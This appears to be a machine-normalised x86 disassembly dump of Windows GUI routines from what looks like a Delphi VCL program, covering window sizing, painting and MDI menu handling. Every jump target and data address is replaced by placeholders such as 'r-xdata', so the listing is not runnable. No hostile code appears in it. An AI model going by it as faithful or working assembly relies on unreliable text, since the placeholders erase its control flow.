mov edx esi
mov eax ebx
call sub_440e20
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_440d58
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_440d58
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_4537fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_4412fc
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_41a074
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41a048
mov edi eax
mov eax edi
mov si 0xfff1
call sub_403394
test al al
jne r-xdata
sub_453868
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_4030e0
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_453894
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax ebp
call sub_43da88
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_41a074
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_441344
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_41a048
mov si 0xfff1
call sub_403394
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_41a084
jmp r-xdata
sub_453928
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_43a758
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43b724
sub_453950
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_439f8c
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_453980
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_439fd0
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_4539b0
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_43a490
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_454ae8
pop esi
pop ebx
retn
sub_4539f4
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_453a4d
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453a54
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
sub_453a5c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_43a444
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_43e2b0
mov eax ebx
call sub_43e44c
sub_453a94
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_419ec0
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_453ad4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43e76c
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403394
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403394
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_43b724
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_43b724
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_43b724
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_43b724
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_43b724
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_43b724
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_44dbf8
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_454400
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d768
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_453d4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_453d30
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41dde0
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41dc80
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_44f0e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453d37
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41dde0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_44dbf8
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_454400
call sub_440d58
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_453e7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d768
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_453e54
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_453e37
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41dde0
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_41dc80
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453e3e
xor edx edx
mov eax [ ebp - 0xc ]
call sub_41dde0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_440d58
mov esi eax
sub_453e5b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call ReleaseDC
retn
sub_453f0c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_453f58
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_454434
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_454480
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_453f98
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_454166
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41d64c
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43ea0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_43a0b4
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_438eac
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_453f0c
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41d64c
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_454434
test eax eax
je r-xdata
push ebp
call sub_453f0c
pop ecx
push ebp
call sub_453f0c
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_453f58
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_451278
jmp r-xdata
sub_454178
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_452440
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_4541e4
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_452adc
mov eax ebx
call sub_44105c
test al al
je r-xdata
mov eax ebx
call sub_41a074
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_440d58
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_43db7c
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_440d58
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_41a048
call sub_44e73c
mov edx esi
mov eax ebx
call sub_41a048
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
sub_45427c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_4542f9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_454304
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_43e2f8
sub_454330
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_43e2f8
xor edx edx
jmp r-xdata
mov eax esi
call sub_4525bc
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_454368
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_439d74
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_43e2f8
sub_4543ac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_439e80
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_454400
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_4373fc
sub_454434
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_457fa4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_457f90
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_454480
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_457fa4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_457f90
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_4544d0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_413eec
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_454500
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_440d58
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_457f74
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_457f74
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_4544d0
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_457f74
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_457f60
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_414098
call sub_403198
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_457f60
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_457f60
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_457f60
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_454604
push ebx
mov ebx eax
mov eax ebx
call sub_4545fc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_42395c
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_45462c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_43e2b0
mov dl 0x1
mov eax esi
call sub_454990
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_454a0c
mov edx eax
mov eax esi
call sub_43a710
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_43e44c
mov dl 0x1
mov eax esi
call sub_4539b0
sub_4546ac
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_440d58
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_44ad38
mov edi eax
mov eax ebp
call sub_440d58
push eax
call DrawMenuBar
sub_454728
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_419b20
xor edx edx
mov eax ebx
call sub_44c6d0
sub_45474c
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_4546ac
mov eax edx
mov edx ebx
call sub_419b20
sub_454774
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45493a
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_457fa4
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_44e284
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_457f90
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_419b20
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_457f90
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_403924
mov eax ebx
call sub_44105c
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_440d58
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_4546ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454941
lea eax [ ebp - 0x10 ]
call sub_403ee8
retn
mov dl 0x1
mov eax ebx
call sub_455838
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_44105c
test al al
je r-xdata
mov eax ebx
call sub_44105c
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_440d58
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_440d58
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_440d58
mov edx eax
mov eax esi
call sub_44e284
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_440d58
push eax
call SetMenu
sub_45495c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_454948
cmp esi eax
je r-xdata
